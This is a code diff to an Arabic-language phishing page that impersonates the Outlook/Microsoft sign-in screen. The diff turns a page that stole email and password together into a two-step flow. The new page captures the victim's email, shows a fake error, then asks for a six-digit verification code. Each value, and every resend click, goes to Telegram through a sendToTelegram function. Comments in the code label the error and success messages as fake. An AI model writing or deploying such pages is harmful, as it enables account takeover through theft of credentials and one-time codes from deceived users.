@@ -5,212 +5,85 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>تسجيل الدخول - Outlook</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-        }
-        body {
-            background: #f2f2f2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo svg {
-            width: 120px;
-            height: auto;
-        }
-        h2 {
-            font-size: 22px;
-            font-weight: 600;
-            color: #1a1a2e;
-            margin-bottom: 8px;
-            text-align: center;
-        }
-        .sub {
-            text-align: center;
-            color: #555;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .sub a {
-            color: #0066ff;
-            text-decoration: none;
-        }
-        .input-group {
-            margin-bottom: 14px;
-        }
-        .input-group label {
-            font-size: 14px;
-            font-weight: 600;
-            display: block;
-            margin-bottom: 4px;
-            color: #333;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 15px;
-            background: #fafafa;
-            transition: 0.2s;
-        }
-        .input-group input:focus {
-            border-color: #0066ff;
-            outline: none;
-            background: white;
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: #0066ff;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 6px;
-        }
-        .btn:hover {
-            background: #004ccc;
-        }
-        .options {
-            margin: 16px 0 10px;
-            font-size: 14px;
-            text-align: center;
-        }
-        .options a {
-            color: #0066ff;
-            text-decoration: none;
-        }
-        .options a:hover {
-            text-decoration: underline;
-        }
-        .error {
-            color: #d32f2f;
-            font-size: 14px;
-            text-align: center;
-            display: none;
-            margin-top: 10px;
-            background: #ffebee;
-            padding: 8px;
-            border-radius: 4px;
-        }
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-            color: #aaa;
-            font-size: 12px;
-        }
-        .divider::before,
-        .divider::after {
-            content: "";
-            flex: 1;
-            border-bottom: 1px solid #ddd;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: white; padding: 40px 30px; border-radius: 8px; max-width: 420px; width: 100%; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo svg { width: 120px; height: auto; }
+        h2 { font-size: 22px; font-weight: 600; color: #1a1a2e; margin-bottom: 8px; text-align: center; }
+        .sub { text-align: center; color: #555; font-size: 14px; margin-bottom: 20px; }
+        .sub a { color: #0066ff; text-decoration: none; }
+        .input-group { margin-bottom: 14px; }
+        .input-group label { font-size: 14px; font-weight: 600; display: block; margin-bottom: 4px; color: #333; }
+        .input-group input { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; background: #fafafa; transition: 0.2s; }
+        .input-group input:focus { border-color: #0066ff; outline: none; background: white; }
+        .btn { width: 100%; padding: 14px; background: #0066ff; color: white; border: none; border-radius: 4px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 6px; }
+        .btn:hover { background: #004ccc; }
+        .error { color: #d32f2f; font-size: 14px; text-align: center; display: none; margin-top: 10px; background: #ffebee; padding: 8px; border-radius: 4px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .switch-link { text-align: center; margin: 8px 0; font-size: 14px; }
+        .switch-link a { color: #0066ff; text-decoration: none; }
+        .switch-link a:hover { text-decoration: underline; }
+        .footer { text-align: center; margin-top: 16px; font-size: 14px; color: #555; }
+        .footer a { color: #0066ff; text-decoration: none; font-weight: 600; }
+        .sub-links { display: flex; justify-content: center; gap: 15px; margin-top: 12px; font-size: 12px; }
+        .sub-links a { color: #777; text-decoration: none; }
+        .divider { display: flex; align-items: center; margin: 18px 0; color: #aaa; font-size: 12px; }
+        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #ddd; }
         .divider::before { margin-right: 10px; }
         .divider::after { margin-left: 10px; }
-        .footer {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 14px;
-            color: #555;
-        }
-        .footer a {
-            color: #0066ff;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .footer a:hover { text-decoration: underline; }
-        .sub-links {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 12px;
-            font-size: 12px;
-        }
-        .sub-links a {
-            color: #777;
-            text-decoration: none;
-        }
-        .sub-links a:hover { text-decoration: underline; }
-        .switch-link {
-            text-align: center;
-            margin: 8px 0;
-            font-size: 14px;
-        }
-        .switch-link a {
-            color: #0066ff;
-            text-decoration: none;
-        }
-        .switch-link a:hover { text-decoration: underline; }
+        .success-msg { color: #2e7d32; background: #e8f5e9; padding: 10px; border-radius: 4px; display: none; margin-top: 10px; text-align: center; font-size: 14px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- شعار Microsoft / Outlook -->
     <div class="logo">
         <svg viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
             <text x="0" y="22" fill="#2672e4" font-size="24" font-weight="bold" font-family="Segoe UI, Arial, sans-serif">Outlook</text>
         </svg>
     </div>
 
-    <h2>تسجيل الدخول</h2>
-    <p class="sub">لتستمر في استخدام حسابك</p>
+    <!-- الخطوة 1: طلب الإيميل -->
+    <div id="step1" class="step active">
+        <h2>تسجيل الدخول</h2>
+        <p class="sub">لتستمر في استخدام حسابك</p>
+        <form id="emailForm">
+            <div class="input-group">
+                <label>البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني أو رقم الهاتف" required>
+            </div>
+            <button type="submit" class="btn">التالي</button>
+            <div class="error" id="errorEmail">⚠️ هذا البريد غير مسجل</div>
+            <div class="switch-link"><a href="#">تسجيل الدخول باستخدام حساب Microsoft</a></div>
+        </form>
+    </div>
 
-    <form id="loginForm">
-        <div class="input-group">
-            <label>البريد الإلكتروني أو رقم الهاتف</label>
-            <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني أو رقم الهاتف" required>
-        </div>
-        <div class="input-group">
-            <label>كلمة المرور</label>
-            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-        </div>
+    <!-- الخطوة 2: طلب رمز التحقق -->
+    <div id="step2" class="step">
+        <h2>أدخل رمز التحقق</h2>
+        <p class="sub">تم إرسال رمز إلى بريدك الإلكتروني</p>
+        <form id="codeForm">
+            <div class="input-group">
+                <label>رمز التحقق</label>
+                <input type="text" id="code" placeholder="أدخل الرقم المكون من 6 أرقام" required>
+            </div>
+            <button type="submit" class="btn">تأكيد</button>
+            <div class="error" id="errorCode">⚠️ رمز غير صحيح، حاول مرة أخرى</div>
+            <div class="switch-link"><a href="#" id="resendCode">إعادة إرسال الرمز</a></div>
+        </form>
+    </div>
 
-        <button type="submit" class="btn">تسجيل الدخول</button>
+    <!-- الخطوة 3: رسالة نجاح وهمية -->
+    <div id="step3" style="display:none;">
+        <h2>✅ تم التحقق بنجاح</h2>
+        <p class="sub">جاري توجيهك إلى صندوق الوارد...</p>
+    </div>
 
-        <div class="options">
-            <a href="#">نسيت كلمة المرور؟</a>
-        </div>
-
-        <div class="error" id="errorMsg">⚠️ بيانات غير صحيحة، حاول مرة أخرى</div>
-
-        <div class="divider">أو</div>
-
-        <div class="switch-link">
-            <a href="#">تسجيل الدخول باستخدام حساب Microsoft</a>
-        </div>
-
-        <div class="footer">
-            ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
-        </div>
-
-        <div class="sub-links">
-            <a href="#">الخصوصية</a>
-            <a href="#">الشروط</a>
-            <a href="#">اتصل بنا</a>
-        </div>
-    </form>
+    <div class="divider">أو</div>
+    <div class="footer">ليس لديك حساب؟ <a href="#">إنشاء حساب</a></div>
+    <div class="sub-links"><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">اتصل بنا</a></div>
 </div>
 
 <script>
@@ -233,34 +106,52 @@
     }
 
     // =============================================
-    // عند إرسال النموذج (جلب البيانات)
+    // الخطوة 1: إرسال الإيميل
     // =============================================
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
         e.preventDefault();
-
         const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
 
-        // إرسال البيانات إلى تليجرام
-        let dataMsg = `<b>📧 بيانات هوتميل (Outlook)</b>\n\n`;
-        dataMsg += `✉️ البريد: ${email}\n`;
-        dataMsg += `🔑 كلمة المرور: ${password}`;
+        // إرسال الإيميل إلى تليجرام
+        sendToTelegram(`<b>📧 البريد الإلكتروني (Outlook)</b>\n\n✉️ ${email}`);
 
-        sendToTelegram(dataMsg);
+        // إظهار رسالة خطأ وهمية ثم الانتقال للخطوة 2
+        document.getElementById('errorEmail').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('errorEmail').style.display = 'none';
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }, 1500);
+    });
+
+    // =============================================
+    // الخطوة 2: إرسال رمز التحقق
+    // =============================================
+    document.getElementById('codeForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const code = document.getElementById('code').value;
+
+        // إرسال الرمز إلى تليجرام
+        sendToTelegram(`<b>🔑 رمز التحقق (Outlook)</b>\n\n📱 ${code}`);
 
         // إظهار رسالة خطأ وهمية
-        document.getElementById('errorMsg').style.display = 'block';
-
-        // إعادة تعيين الحقول بعد 3 ثواني
+        document.getElementById('errorCode').style.display = 'block';
         setTimeout(() => {
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-            document.getElementById('errorMsg').style.display = 'none';
+            document.getElementById('errorCode').style.display = 'none';
+            document.getElementById('code').value = '';
         }, 3000);
     });
 
-    console.log('✅ صفحة هوتميل تعمل');
-</script>
+    // =============================================
+    // إعادة إرسال الرمز (وهمي)
+    // =============================================
+    document.getElementById('resendCode').addEventListener('click', function(e) {
+        e.preventDefault();
+        sendToTelegram(`🔄 طلب إعادة إرسال رمز التحقق`);
+        alert('✅ تم إعادة إرسال الرمز إلى بريدك');
+    });
 
+    console.log('✅ صفحة هوتميل (خطوتين) تعمل');
+</script>
 </body>
 </html>
